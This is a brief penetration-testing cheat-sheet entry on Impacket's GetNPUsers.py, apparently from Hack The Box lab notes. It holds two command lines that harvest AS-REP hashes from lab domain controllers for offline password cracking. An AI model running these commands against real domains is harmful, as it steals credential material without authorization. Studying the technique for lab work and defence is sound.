# GetNPUsers

## Impacket - GetNPUsers

> Impacket’s GetNPUsers.py will attempt to harvest the **non-preauth AS\_REP** responses for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.

```bash
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile userlist.txt -format hashcat -outputfile hashes.aspreproast -dc-ip 10.129.114.194

GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "10.129.95.210" "htb.local"/"":""
```
